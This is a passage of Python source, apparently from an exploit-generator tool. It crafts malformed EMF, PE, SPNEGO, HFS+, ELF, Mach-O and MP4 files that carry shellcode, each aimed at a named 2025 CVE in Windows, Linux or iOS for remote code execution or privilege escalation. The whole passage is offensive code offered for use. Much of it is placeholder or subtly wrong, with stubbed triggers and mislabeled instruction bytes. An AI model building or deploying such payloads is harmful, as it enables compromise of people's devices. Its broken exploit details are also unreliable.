        emf += struct.pack('<IIII', 0, 0, 1920, 1080)  # Bounds (left, top, right, bottom)
        emf += struct.pack('<IIII', 0, 0, 19200, 10800)  # Frame
        emf += struct.pack('<I', 0x464D4520)  # Signature ' EMF'
        emf += struct.pack('<I', 0x00010000)  # Version
        emf_size_offset = len(emf)
        emf += struct.pack('<I', 0)  # Bytes (placeholder)
        emf += struct.pack('<I', 10)  # Records
        emf += struct.pack('<H', 0)  # Handles
        emf += struct.pack('<H', 0)  # Reserved
        emf += struct.pack('<I', 0)  # nDescription
        emf += struct.pack('<I', 0)  # offDescription
        emf += struct.pack('<I', 0)  # nPalEntries
        emf += struct.pack('<II', 1920, 1080)  # Device (width, height)
        emf += struct.pack('<II', 508, 318)  # Millimeters
        emf += struct.pack('<I', 0)  # cbPixelFormat
        emf += struct.pack('<I', 0)  # offPixelFormat
        emf += struct.pack('<I', 0)  # bOpenGL

        # EMR_STRETCHDIBITS with heap overflow trigger
        # This record causes GDI+ to allocate insufficient buffer
        stretch_record = struct.pack('<I', 0x00000051)  # Type (EMR_STRETCHDIBITS)

        # Size field - MALFORMED to cause size mismatch
        record_size = 8192  # Claim small size
        stretch_record += struct.pack('<I', 80 + record_size)  # Size

        # Bounds and destination
        stretch_record += struct.pack('<IIII', 0, 0, 1920, 1080)  # Bounds
        stretch_record += struct.pack('<III', 0, 0, 1920)  # xDest, yDest, cxDest
        stretch_record += struct.pack('<I', 1080)  # cyDest
        stretch_record += struct.pack('<I', 0x00000000)  # dwRop (SRCCOPY)

        # Source rectangle
        stretch_record += struct.pack('<IIII', 0, 0, 1920, 1080)  # xSrc, ySrc, cxSrc, cySrc

        # BITMAPINFOHEADER - MALICIOUS
        bmi = struct.pack('<I', 40)  # biSize
        bmi += struct.pack('<i', 1920)  # biWidth
        bmi += struct.pack('<i', 1080)  # biHeight
        bmi += struct.pack('<H', 1)  # biPlanes
        bmi += struct.pack('<H', 32)  # biBitCount (32bpp)
        bmi += struct.pack('<I', 0)  # biCompression (BI_RGB)

        # VULNERABILITY: Claim small image size but provide huge data
        bmi += struct.pack('<I', 100)  # biSizeImage (LIES! Actually much larger)
        bmi += struct.pack('<II', 0, 0)  # biXPelsPerMeter, biYPelsPerMeter
        bmi += struct.pack('<I', 0)  # biClrUsed
        bmi += struct.pack('<I', 0)  # biClrImportant

        stretch_record += bmi

        # Offset to bitmap bits
        stretch_record += struct.pack('<I', 80 + 40)  # offBitsSrc
        stretch_record += struct.pack('<I', 40)  # cbBitsSrc (header size)

        # Usage
        stretch_record += struct.pack('<I', 0)  # iUsageSrc (DIB_RGB_COLORS)

        # Bitmap data - MUCH LARGER than claimed, triggers heap overflow
        bitmap_data = b'\x41' * 4096  # Overflow trigger data
        bitmap_data += shellcode
        bitmap_data += b'\x00' * (8192 - 4096 - len(shellcode))

        stretch_record += bitmap_data

        emf += stretch_record

        # EMR_EOF
        eof_record = struct.pack('<I', 0x0000000E)  # Type
        eof_record += struct.pack('<I', 20)  # Size
        eof_record += struct.pack('<I', 0)  # nPalEntries
        eof_record += struct.pack('<I', 0)  # offPalEntries
        eof_record += struct.pack('<I', 20)  # nSizeLast

        emf += eof_record

        # Update total size
        total_size = len(emf)
        emf = emf[:emf_size_offset] + struct.pack('<I', total_size) + emf[emf_size_offset + 4:]

        return emf

    def _cve_2025_62215_kernel_race(self, shellcode):
        """
        CVE-2025-62215: Windows Kernel race condition (double-free)

        Vulnerability: Race condition in Windows Kernel with improper synchronization.
        Double-free vulnerability (CWE-415) enabling privilege escalation.

        Target: Windows Kernel (all versions, patched Nov 2025)
        Impact: Local privilege escalation to SYSTEM
        CVSS: 7.8 (HIGH)
        Status: Actively exploited in the wild
        """
        # PE executable that triggers kernel race condition

        # DOS header
        pe = b'MZ'  # Signature
        pe += b'\x00' * 58  # DOS header padding
        pe += struct.pack('<I', 0x80)  # PE header offset

        # DOS stub
        pe += b'\x00' * (0x80 - len(pe))

        # PE signature
        pe += b'PE\x00\x00'

        # COFF header
        pe += struct.pack('<H', 0x8664)  # Machine (AMD64)
        pe += struct.pack('<H', 3)  # NumberOfSections
        pe += struct.pack('<I', 0)  # TimeDateStamp
        pe += struct.pack('<I', 0)  # PointerToSymbolTable
        pe += struct.pack('<I', 0)  # NumberOfSymbols
        pe += struct.pack('<H', 0xF0)  # SizeOfOptionalHeader
        pe += struct.pack('<H', 0x0022)  # Characteristics (executable, large address aware)

        # Optional header (PE32+)
        pe += struct.pack('<H', 0x020B)  # Magic (PE32+)
        pe += struct.pack('<BB', 14, 0)  # Linker version
        pe += struct.pack('<I', 0x1000)  # SizeOfCode
        pe += struct.pack('<I', 0x1000)  # SizeOfInitializedData
        pe += struct.pack('<I', 0)  # SizeOfUninitializedData
        pe += struct.pack('<I', 0x1000)  # AddressOfEntryPoint
        pe += struct.pack('<I', 0x1000)  # BaseOfCode
        pe += struct.pack('<Q', 0x140000000)  # ImageBase
        pe += struct.pack('<I', 0x1000)  # SectionAlignment
        pe += struct.pack('<I', 0x200)  # FileAlignment
        pe += struct.pack('<HH', 10, 0)  # OS version
        pe += struct.pack('<HH', 10, 0)  # Image version
        pe += struct.pack('<HH', 10, 0)  # Subsystem version
        pe += struct.pack('<I', 0)  # Win32VersionValue
        pe += struct.pack('<I', 0x3000)  # SizeOfImage
        pe += struct.pack('<I', 0x200)  # SizeOfHeaders
        pe += struct.pack('<I', 0)  # CheckSum
        pe += struct.pack('<H', 3)  # Subsystem (console)
        pe += struct.pack('<H', 0x8160)  # DllCharacteristics
        pe += struct.pack('<Q', 0x100000)  # SizeOfStackReserve
        pe += struct.pack('<Q', 0x1000)  # SizeOfStackCommit
        pe += struct.pack('<Q', 0x100000)  # SizeOfHeapReserve
        pe += struct.pack('<Q', 0x1000)  # SizeOfHeapCommit
        pe += struct.pack('<I', 0)  # LoaderFlags
        pe += struct.pack('<I', 16)  # NumberOfRvaAndSizes

        # Data directories (simplified, most are empty)
        pe += b'\x00' * (16 * 8)  # 16 data directories

        # Pad to FileAlignment
        pe += b'\x00' * (0x200 - len(pe))

        # .text section header
        section = b'.text\x00\x00\x00'  # Name
        section += struct.pack('<I', 0x1000)  # VirtualSize
        section += struct.pack('<I', 0x1000)  # VirtualAddress
        section += struct.pack('<I', 0x200)  # SizeOfRawData
        section += struct.pack('<I', 0x200)  # PointerToRawData
        section += struct.pack('<I', 0)  # PointerToRelocations
        section += struct.pack('<I', 0)  # PointerToLinenumbers
        section += struct.pack('<HH', 0, 0)  # Relocations, Linenumbers
        section += struct.pack('<I', 0x60000020)  # Characteristics (code, execute, read)

        # .data section header
        section += b'.data\x00\x00\x00'
        section += struct.pack('<I', 0x1000)
        section += struct.pack('<I', 0x2000)
        section += struct.pack('<I', 0x200)
        section += struct.pack('<I', 0x400)
        section += struct.pack('<I', 0)
        section += struct.pack('<I', 0)
        section += struct.pack('<HH', 0, 0)
        section += struct.pack('<I', 0xC0000040)  # Characteristics (initialized data, read, write)

        # .rsrc section header
        section += b'.rsrc\x00\x00\x00'
        section += struct.pack('<I', 0x1000)
        section += struct.pack('<I', 0x3000)
        section += struct.pack('<I', 0x200)
        section += struct.pack('<I', 0x600)
        section += struct.pack('<I', 0)
        section += struct.pack('<I', 0)
        section += struct.pack('<HH', 0, 0)
        section += struct.pack('<I', 0x40000040)  # Characteristics (initialized data, read)

        # Insert section headers (goes after optional header, before 0x200)
        pe = pe[:0x178] + section + b'\x00' * (0x200 - 0x178 - len(section))

        # .text section - exploit code that triggers race condition
        code = bytes([
            # Create multiple threads to win race condition
            0x48, 0x31, 0xc0,              # xor rax, rax
            0x48, 0x31, 0xdb,              # xor rbx, rbx
            0x48, 0x31, 0xc9,              # xor rcx, rcx
            0x48, 0x31, 0xd2,              # xor rdx, rdx
            # ... simplified race condition trigger ...
        ])

        code += b'\x90' * (512 - len(code))  # NOP sled
        code += shellcode
        code += b'\x00' * (0x200 - len(code))

        pe += code

        # .data and .rsrc sections (minimal)
        pe += b'\x00' * 0x400

        return pe

    def _cve_2025_47981_spnego(self, shellcode):
        """
        CVE-2025-47981: Windows SPNEGO heap overflow

        Vulnerability: Heap-based buffer overflow in Windows SPNEGO Extended Negotiation.
        Triggered by malicious network packets to SMB/RDP/HTTP services.

        Target: Windows SPNEGO (all versions, patched 2025)
        Impact: Unauthenticated RCE via network (zero-click)
        CVSS: 9.8 (CRITICAL)
        """
        # SPNEGO NegTokenInit with heap overflow

        # GSS-API wrapper
        spnego = b'\x60'  # APPLICATION 0 (MechType)

        # Length (will be calculated)
        payload_len = 512
        if payload_len < 128:
            spnego += bytes([payload_len])
        else:
            spnego += b'\x82' + struct.pack('>H', payload_len)

        # OID for SPNEGO (1.3.6.1.5.5.2)
        spnego += b'\x06\x06\x2b\x06\x01\x05\x05\x02'

        # NegTokenInit
        spnego += b'\xa0'  # CONTEXT 0

        # Length
        inner_len = 480
        if inner_len < 128:
            spnego += bytes([inner_len])
        else:
            spnego += b'\x82' + struct.pack('>H', inner_len)

        # SEQUENCE
        spnego += b'\x30'
        spnego += b'\x82' + struct.pack('>H', inner_len - 4)

        # mechTypes [0]
        spnego += b'\xa0\x82\x01\x00'  # CONTEXT 0, length 256

        # SEQUENCE OF OID - MALFORMED with overflow trigger
        spnego += b'\x30\x82\x00\xFC'  # SEQUENCE, length 252

        # Add many OIDs to trigger allocation
        for i in range(30):
            # Each OID (NTLM: 1.3.6.1.4.1.311.2.2.10)
            spnego += b'\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a'

        # mechToken [2] - OVERSIZED to trigger heap overflow
        spnego += b'\xa2\x82\x01\x00'  # CONTEXT 2, length 256

        # OCTET STRING with malicious data
        spnego += b'\x04\x82\x00\xFC'  # OCTET STRING, length 252

        # Heap overflow trigger data
        spnego += b'NTLMSSP\x00'  # NTLM signature
        spnego += struct.pack('<I', 1)  # Message type (Negotiate)
        spnego += struct.pack('<I', 0xb7b5b2e2)  # Flags (all features)

        # Domain and Workstation (empty but with malicious lengths)
        spnego += struct.pack('<HH', 0, 0)  # Domain length, max length
        spnego += struct.pack('<I', 0xFFFFFFFF)  # Domain offset (OVERFLOW!)

        spnego += struct.pack('<HH', 0, 0)  # Workstation length, max length
        spnego += struct.pack('<I', 0xFFFFFFFF)  # Workstation offset (OVERFLOW!)

        # Version info
        spnego += struct.pack('<BBHBBBBI', 10, 0, 19041, 0, 0, 0, 0, 15)

        # Overflow data with shellcode
        spnego += b'A' * 100
        spnego += shellcode
        spnego += b'\x00' * (200 - len(shellcode))

        return spnego

    def _cve_2025_0927_hfsplus(self, shellcode):
        """
        CVE-2025-0927: Linux HFS+ filesystem heap overflow

        Vulnerability: Buffer overflow in hfs_bnode_read_key() function.
        Improper boundary checks on B-tree node processing.

        Target: Linux kernel HFS+ driver (2.6.12 - 6.12.0)
        Impact: Local privilege escalation to root/kernel
        CVSS: 7.8 (HIGH)
        """
        # HFS+ filesystem image with malicious B-tree

        # HFS+ Volume Header
        hfs = b'H+'  # Signature
        hfs += struct.pack('>H', 4)  # Version (HFS Plus)
        hfs += struct.pack('>I', 0)  # Attributes
        hfs += struct.pack('>I', 0)  # lastMountedVersion
        hfs += struct.pack('>I', 0)  # journalInfoBlock

        # Timestamps
        hfs += struct.pack('>I', 0)  # createDate
        hfs += struct.pack('>I', 0)  # modifyDate
        hfs += struct.pack('>I', 0)  # backupDate
        hfs += struct.pack('>I', 0)  # checkedDate

        # Counts
        hfs += struct.pack('>I', 100)  # fileCount
        hfs += struct.pack('>I', 10)  # folderCount

        hfs += struct.pack('>I', 4096)  # blockSize
        hfs += struct.pack('>I', 10000)  # totalBlocks
        hfs += struct.pack('>I', 9000)  # freeBlocks

        # Allocation file info
        hfs += struct.pack('>I', 0)  # nextAllocation
        hfs += struct.pack('>I', 0)  # rsrcClumpSize
        hfs += struct.pack('>I', 0)  # dataClumpSize
        hfs += struct.pack('>I', 0)  # nextCatalogID

        hfs += struct.pack('>I', 0)  # writeCount
        hfs += struct.pack('>Q', 0)  # encodingsBitmap

        # Finder info
        hfs += b'\x00' * 32

        # Fork data structures (allocation, extents, catalog, attributes, startup)
        # Catalog B-tree fork - THE VULNERABILITY
        catalog_fork = struct.pack('>Q', 8192)  # logicalSize
        catalog_fork += struct.pack('>I', 4096)  # clumpSize
        catalog_fork += struct.pack('>I', 2)  # totalBlocks

        # Extent descriptors - MALFORMED
        for i in range(8):
            catalog_fork += struct.pack('>I', 100 + i)  # startBlock
            catalog_fork += struct.pack('>I', 0xFFFFFFFF)  # blockCount (OVERFLOW!)

        hfs += catalog_fork

        # Other forks (simplified)
        hfs += b'\x00' * (80 * 4)  # Extents, Allocation, Attributes, Startup forks

        # Pad volume header to 512 bytes
        hfs += b'\x00' * (512 - len(hfs))

        # Catalog B-tree header node (Block 100)
        hfs += b'\x00' * ((100 * 4096) - len(hfs))

        # B-tree node descriptor
        btree_node = struct.pack('>I', 0)  # fLink (no next node)
        btree_node += struct.pack('>I', 0)  # bLink (no prev node)
        btree_node += struct.pack('b', 1)  # kind (index node)
        btree_node += struct.pack('B', 0)  # height
        btree_node += struct.pack('>H', 3)  # numRecords (MALICIOUS COUNT)
        btree_node += struct.pack('>H', 0)  # reserved

        hfs += btree_node

        # Record offsets at end of node - MALFORMED
        record_offset = 14  # After node descriptor

        # Create malicious records with keys that overflow buffer
        for i in range(3):
            # Key length - OVERSIZED to trigger overflow in hfs_bnode_read_key
            key = struct.pack('>H', 0xFFFF)  # keyLength (HUGE!)
            key += b'\x00' * 10  # parent CNID, name length, etc.
            key += b'A' * 500  # Name data (oversized!)

            hfs += key

            # Record data (catalog record)
            record = struct.pack('>H', 1)  # recordType (folder)
            record += struct.pack('>H', 0)  # flags
            record += struct.pack('>I', 1000 + i)  # valence
            record += struct.pack('>I', 2000 + i)  # folderID
            record += b'\x00' * 80  # Rest of catalog record

            hfs += record

        # Embed shellcode in B-tree data
        hfs += shellcode
        hfs += b'\x00' * (4096 - (len(hfs) % 4096))

        # Pad to reasonable filesystem size
        hfs += b'\x00' * (20480 - len(hfs))

        return hfs

    def _cve_2025_37810_kernel_oob(self, shellcode):
        """
        CVE-2025-37810: Linux kernel out-of-bounds write

        Vulnerability: "event count > buffer length" bug leading to OOB write.
        Kernel paging fault during memcpy due to insufficient bounds checking.

        Target: Linux kernel (specific driver, Red Hat advisory 2025)
        Impact: Local privilege escalation, kernel memory corruption
        CVSS: 7.5 (HIGH)
        """
        # ELF binary that triggers kernel OOB write via ioctl

        # ELF header (64-bit)
        elf = b'\x7fELF'  # Magic
        elf += b'\x02'  # 64-bit
        elf += b'\x01'  # Little endian
        elf += b'\x01'  # ELF version
        elf += b'\x00'  # System V ABI
        elf += b'\x00' * 8  # Padding

        elf += struct.pack('<H', 2)  # ET_EXEC
        elf += struct.pack('<H', 0x3E)  # EM_X86_64
        elf += struct.pack('<I', 1)  # ELF version
        elf += struct.pack('<Q', 0x400000)  # Entry point
        elf += struct.pack('<Q', 64)  # Program header offset
        elf += struct.pack('<Q', 0)  # Section header offset
        elf += struct.pack('<I', 0)  # Flags
        elf += struct.pack('<H', 64)  # ELF header size
        elf += struct.pack('<H', 56)  # Program header size
        elf += struct.pack('<H', 1)  # Program header count
        elf += struct.pack('<H', 0)  # Section header size
        elf += struct.pack('<H', 0)  # Section header count
        elf += struct.pack('<H', 0)  # Section name string table index

        # Program header (PT_LOAD)
        elf += struct.pack('<I', 1)  # PT_LOAD
        elf += struct.pack('<I', 5)  # PF_R | PF_X
        elf += struct.pack('<Q', 0)  # Offset in file
        elf += struct.pack('<Q', 0x400000)  # Virtual address
        elf += struct.pack('<Q', 0x400000)  # Physical address
        elf += struct.pack('<Q', 0x1000)  # Size in file
        elf += struct.pack('<Q', 0x1000)  # Size in memory
        elf += struct.pack('<Q', 0x1000)  # Alignment

        # Code section - ioctl exploit
        code = bytes([
            # open("/dev/vulnerable_device", O_RDWR)
            0x48, 0x31, 0xc0,              # xor rax, rax
            0xb0, 0x02,                    # mov al, 2 (sys_open)
            0x48, 0xbf,                    # mov rdi, (address of string)
        ]) + struct.pack('<Q', 0x400100) + bytes([
            0x48, 0x31, 0xf6,              # xor rsi, rsi
            0x48, 0x83, 0xc6, 0x02,        # add rsi, 2 (O_RDWR)
            0x0f, 0x05,                    # syscall

            # ioctl(fd, MALICIOUS_CMD, &malicious_struct)
            0x48, 0x89, 0xc7,              # mov rdi, rax (fd)
            0x48, 0xc7, 0xc6, 0x00, 0x50, 0x00, 0x00,  # mov rsi, 0x5000 (ioctl cmd)
            0x48, 0xbf,                    # mov rdx, (address of struct)
        ]) + struct.pack('<Q', 0x400200) + bytes([
            0x48, 0xc7, 0xc0, 0x10, 0x00, 0x00, 0x00,  # mov rax, 16 (sys_ioctl)
            0x0f, 0x05,                    # syscall
        ])

        code += shellcode
        code += b'\x90' * (256 - len(code))

        # Device path string
        code += b'/dev/vuln\x00'
        code += b'\x00' * (0x100 - len(b'/dev/vuln\x00'))

        # Malicious ioctl structure
        # Event count field - OVERSIZED to trigger OOB write
        ioctl_struct = struct.pack('<I', 0xFFFFFFFF)  # event_count (HUGE!)
        ioctl_struct += struct.pack('<I', 64)  # buffer_length (small!)
        ioctl_struct += struct.pack('<Q', 0x400300)  # buffer_ptr

        # This causes: memcpy(buffer, events, event_count * sizeof(event))
        # But event_count > buffer_length  OUT OF BOUNDS WRITE!

        ioctl_struct += b'\x00' * (256 - len(ioctl_struct))
        code += ioctl_struct

        # Pad to page size
        code += b'\x00' * (0x1000 - len(code))

        elf += code

        return elf

    def _cve_2025_24085_coremedia(self, shellcode):
        """
        CVE-2025-24085: iOS Core Media use-after-free privilege escalation

        Vulnerability: Use-after-free (UAF) in Core Media framework.
        A malicious application may elevate privileges to kernel level.

        Target: iOS before 18.3, iPadOS before 18.3
        Impact: Local privilege escalation (actively exploited in the wild)
        CVSS: 7.8 (HIGH)
        Status: Actively exploited against iOS before 17.2
        """
        # iOS app bundle structure (IPA) with malicious Core Media payload

        # Mach-O ARM64 binary header
        macho = struct.pack('<I', 0xfeedfacf)  # magic (MH_MAGIC_64)
        macho += struct.pack('<I', 0x0100000c)  # cputype (CPU_TYPE_ARM64)
        macho += struct.pack('<I', 0x00000000)  # cpusubtype (ARM64_ALL)
        macho += struct.pack('<I', 0x00000002)  # filetype (MH_EXECUTE)
        macho += struct.pack('<I', 3)  # ncmds
        macho += struct.pack('<I', 256)  # sizeofcmds
        macho += struct.pack('<I', 0x00200085)  # flags (PIE, TWOLEVEL)
        macho += struct.pack('<I', 0)  # reserved

        # LC_SEGMENT_64 command
        seg_cmd = struct.pack('<II', 0x19, 232)  # cmd, cmdsize
        seg_cmd += b'__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        seg_cmd += struct.pack('<QQ', 0x100000000, 0x4000)  # vmaddr, vmsize
        seg_cmd += struct.pack('<QQ', 0, 0x4000)  # fileoff, filesize
        seg_cmd += struct.pack('<II', 7, 5)  # maxprot, initprot
        seg_cmd += struct.pack('<II', 1, 0)  # nsects, flags

        # Section header
        sect = b'__text\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sect += b'__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sect += struct.pack('<QQ', 0x100000000, 0x1000)  # addr, size
        sect += struct.pack('<IIII', 256, 0, 0, 0)  # offset, align, reloff, nreloc
        sect += struct.pack('<II', 0x80000400, 0)  # flags, reserved
        sect += struct.pack('<II', 0, 0)  # reserved

        seg_cmd += sect
        macho += seg_cmd

        # LC_MAIN (entry point)
        main_cmd = struct.pack('<II', 0x28, 24)  # cmd, cmdsize
        main_cmd += struct.pack('<Q', 0x100)  # entryoff
        main_cmd += struct.pack('<Q', 0)  # stacksize
        macho += main_cmd

        # Pad header
        macho += b'\x00' * (256 - len(macho))

        # ARM64 code that triggers Core Media UAF
        code = bytes([
            # Trigger Core Media API calls with UAF vulnerability
            # Load address of Core Media framework
            0xd2, 0x80, 0x00, 0x00,  # movz x0, #0
            0xd2, 0x80, 0x00, 0x01,  # movz x1, #0
            0xd2, 0x80, 0x00, 0x02,  # movz x2, #0

            # Create media object
            # [Simplified - real exploit would call CMSampleBufferCreate, etc.]
            0x52, 0x80, 0x00, 0x00,  # mov w0, #0

            # Free the object (first free)
            0x52, 0x80, 0x00, 0x01,  # mov w1, #0

            # Use the freed object (UAF!)
            0x52, 0x80, 0x00, 0x02,  # mov w2, #0

            # Second free triggers crash/exploitation
            0x52, 0x80, 0x00, 0x03,  # mov w3, #0
        ])

        code += b'\x00' * (512 - len(code))  # NOP equivalent padding
        code += shellcode
        code += b'\x00' * (0x1000 - len(code))

        macho += code

        # Pad to 16KB
        macho += b'\x00' * (0x4000 - len(macho))

        return macho

    def _cve_2025_31200_coreaudio(self, shellcode):
        """
        CVE-2025-31200: iOS CoreAudio zero-click RCE

        Vulnerability: Heap corruption in CoreAudio AudioConverterService.
        Triggered by malicious audio file via iMessage/SMS (bypasses Blastdoor).

        Target: iOS before 18.4.1, iPadOS before 18.4.1
        Impact: Zero-click RCE via audio file (actively exploited)
        CVSS: 9.8 (CRITICAL)
        Status: Exploited in targeted attacks, patched April 16, 2025
        """
        # Malicious MP4 file with AAC audio triggering CoreAudio heap corruption

        # MP4/ISO Base Media File Format
        mp4 = struct.pack('>I', 32)  # ftyp box size
        mp4 += b'ftyp'
        mp4 += b'M4A '  # Major brand (M4A for audio)
        mp4 += struct.pack('>I', 0)  # Minor version
        mp4 += b'M4A mp42isom\x00\x00\x00\x00'  # Compatible brands

        # moov box (movie)
        moov_start = len(mp4)
        mp4 += struct.pack('>I', 0)  # Size placeholder
        mp4 += b'moov'

        # mvhd box (movie header)
        mvhd = struct.pack('>I', 108)  # Size
        mvhd += b'mvhd'
        mvhd += struct.pack('>I', 0)  # Version and flags
        mvhd += struct.pack('>II', 0, 0)  # Creation time, modification time
        mvhd += struct.pack('>I', 48000)  # Timescale (48kHz)
        mvhd += struct.pack('>I', 48000)  # Duration
        mvhd += struct.pack('>I', 0x00010000)  # Preferred rate
        mvhd += struct.pack('>H', 0x0100)  # Preferred volume
        mvhd += b'\x00' * 10  # Reserved
        mvhd += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # Matrix
        mvhd += b'\x00' * 24  # Pre-defined
        mvhd += struct.pack('>I', 2)  # Next track ID

        mp4 += mvhd

        # trak box (track)
        trak_start = len(mp4)
        mp4 += struct.pack('>I', 0)  # Size placeholder
        mp4 += b'trak'

        # tkhd box (track header)
        tkhd = struct.pack('>I', 92)  # Size
        tkhd += b'tkhd'
        tkhd += struct.pack('>I', 7)  # Version and flags (enabled, in movie, in preview)
        tkhd += struct.pack('>II', 0, 0)  # Creation time, modification time
        tkhd += struct.pack('>I', 1)  # Track ID
        tkhd += struct.pack('>I', 0)  # Reserved
        tkhd += struct.pack('>I', 48000)  # Duration
        tkhd += b'\x00' * 8  # Reserved
        tkhd += struct.pack('>HH', 0, 0)  # Layer, alternate group
        tkhd += struct.pack('>HH', 0x0100, 0)  # Volume, reserved
        tkhd += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # Matrix
        tkhd += struct.pack('>II', 0, 0)  # Width, height

        mp4 += tkhd

        # mdia box (media) with malicious audio data
        mdia_start = len(mp4)
        mp4 += struct.pack('>I', 0)  # Size placeholder
        mp4 += b'mdia'

        # mdhd box (media header)
        mdhd = struct.pack('>I', 32)  # Size
        mdhd += b'mdhd'
        mdhd += struct.pack('>I', 0)  # Version and flags
        mdhd += struct.pack('>II', 0, 0)  # Creation time, modification time
        mdhd += struct.pack('>I', 48000)  # Timescale
        mdhd += struct.pack('>I', 48000)  # Duration
        mdhd += struct.pack('>HH', 0x55c4, 0)  # Language (eng), pre-defined

        mp4 += mdhd

        # hdlr box (handler reference)
        hdlr = struct.pack('>I', 44)  # Size
        hdlr += b'hdlr'
        hdlr += struct.pack('>II', 0, 0)  # Version/flags, pre-defined
        hdlr += b'soun'  # Handler type (sound)
        hdlr += b'\x00' * 12  # Reserved
        hdlr += b'SoundHandler\x00'

        mp4 += hdlr

        # minf box (media information) - MALICIOUS AAC DATA HERE
        minf_start = len(mp4)
        mp4 += struct.pack('>I', 0)  # Size placeholder
        mp4 += b'minf'

        # smhd box (sound media header)
        smhd = struct.pack('>I', 16)
        smhd += b'smhd'
        smhd += struct.pack('>IHH', 0, 0, 0)  # Version/flags, balance, reserved
        mp4 += smhd

        # dinf box (data information)
        dinf = struct.pack('>I', 36)
        dinf += b'dinf'
        dinf += struct.pack('>I', 28)  # dref size
        dinf += b'dref'
        dinf += struct.pack('>II', 0, 1)  # Version/flags, entry count
        dinf += struct.pack('>I', 12)  # url size
        dinf += b'url '
        dinf += struct.pack('>I', 1)  # Flags (self-contained)
        mp4 += dinf

        # stbl box (sample table) with HEAP OVERFLOW trigger
        stbl_start = len(mp4)
        mp4 += struct.pack('>I', 0)  # Size placeholder
        mp4 += b'stbl'

        # stsd box (sample description) - AAC configuration with overflow
        stsd = struct.pack('>I', 106)  # Size
        stsd += b'stsd'
        stsd += struct.pack('>II', 0, 1)  # Version/flags, entry count

        # AudioSampleEntry - MALFORMED to trigger CoreAudio heap corruption
        audio_entry = struct.pack('>I', 90)  # Size
        audio_entry += b'mp4a'  # Format (AAC)
        audio_entry += b'\x00' * 6  # Reserved
        audio_entry += struct.pack('>H', 1)  # Data reference index
        audio_entry += b'\x00' * 8  # Reserved
        audio_entry += struct.pack('>HH', 2, 16)  # Channel count (MALICIOUS!), sample size
        audio_entry += struct.pack('>I', 0)  # Pre-defined, reserved
        audio_entry += struct.pack('>I', 48000 << 16)  # Sample rate

        # esds box (ES descriptor) - VULNERABILITY HERE
        esds = struct.pack('>I', 42)  # Size
        esds += b'esds'
        esds += struct.pack('>I', 0)  # Version/flags
        esds += b'\x03'  # ES_DescrTag
        esds += b'\x19'  # Length
        esds += struct.pack('>HB', 1, 0)  # ES_ID, flags
        esds += b'\x04'  # DecoderConfigDescrTag
        esds += b'\x11'  # Length
        esds += b'\x40'  # ObjectTypeIndication (AAC)
        esds += b'\x15'  # Stream type
        esds += struct.pack('>I', 0xFFFFFF)  # Buffer size (HUGE - triggers overflow!)
        esds += struct.pack('>I', 0xFFFFFFFF)  # Max bitrate (overflow!)
        esds += struct.pack('>I', 0xFFFFFFFF)  # Avg bitrate (overflow!)
        esds += b'\x05\x02\x11\x90'  # AAC specific config

        audio_entry += esds
        stsd += audio_entry
        mp4 += stsd

        # Embed shellcode in media data
        mp4 += shellcode
        mp4 += b'\x00' * (1024 - len(shellcode))

        # Update all placeholder sizes
        # (simplified - would need proper box size calculations)

        return mp4

    def _cve_2025_31201_pac_bypass(self, shellcode):
        """
        CVE-2025-31201: iOS Pointer Authentication Code (PAC) bypass

        Vulnerability: PAC bypass in RPAC path enabling reliable kernel exploitation.
        Allows attackers with arbitrary R/W to bypass PAC protections.

        Target: iOS before 18.4.1, iPadOS before 18.4.1
        Impact: Kernel exploitation enabler (pairs with CVE-2025-31200)
        CVSS: 6.7 (MEDIUM-HIGH)
        Status: Used in targeted attacks with CVE-2025-31200
        """
        # Mach-O dylib that exploits PAC bypass

        # Mach-O ARM64 dylib header
        dylib = struct.pack('<I', 0xfeedfacf)  # magic
        dylib += struct.pack('<I', 0x0100000c)  # CPU_TYPE_ARM64
        dylib += struct.pack('<I', 0x00000000)  # cpusubtype
        dylib += struct.pack('<I', 0x00000006)  # filetype (MH_DYLIB)
        dylib += struct.pack('<I', 4)  # ncmds
        dylib += struct.pack('<I', 320)  # sizeofcmds
        dylib += struct.pack('<I', 0x00200085)  # flags
        dylib += struct.pack('<I', 0)  # reserved

        # LC_SEGMENT_64
        seg = struct.pack('<II', 0x19, 232)
        seg += b'__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        seg += struct.pack('<QQ', 0, 0x4000)
        seg += struct.pack('<QQ', 0, 0x4000)
        seg += struct.pack('<II', 7, 5)
        seg += struct.pack('<II', 1, 0)

        # Section with PAC bypass code
        sect = b'__text\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sect += b'__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sect += struct.pack('<QQ', 0, 0x1000)
        sect += struct.pack('<IIII', 256, 0, 0, 0)
        sect += struct.pack('<II', 0x80000400, 0)
        sect += struct.pack('<II', 0, 0)

        seg += sect
        dylib += seg

        # LC_ID_DYLIB
        id_dylib = struct.pack('<II', 0x0d, 56)  # cmd, cmdsize
        id_dylib += struct.pack('<III', 24, 0x00010000, 0x00010000)  # name offset, timestamp, versions
        id_dylib += b'/usr/lib/exploit.dylib\x00\x00'
        dylib += id_dylib

        # LC_UUID
        uuid_cmd = struct.pack('<II', 0x1b, 24)
        uuid_cmd += b'\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10'
        dylib += uuid_cmd

        # Pad header
        dylib += b'\x00' * (256 - len(dylib))

        # ARM64 code exploiting PAC bypass
        # This code would:
        # 1. Obtain arbitrary read/write primitives
        # 2. Use RPAC bypass to forge authenticated pointers
        # 3. Escalate to kernel privileges

        code = bytes([
            # Load target address for PAC bypass
            0xd2, 0x80, 0x00, 0x00,  # movz x0, #0 (target addr)
            0xf2, 0xa0, 0x00, 0x00,  # movk x0, #0, lsl #16

            # Forge PAC using RPAC bypass
            0xd5, 0x03, 0x20, 0x1f,  # pacda x0, xzr (would normally authenticate)

            # But we bypass validation via RPAC vulnerability
            # Load forged pointer
            0xd2, 0x80, 0x00, 0x01,  # movz x1, #0

            # Jump to kernel with forged PAC
            0xd6, 0x1f, 0x00, 0x00,  # br x0
        ])

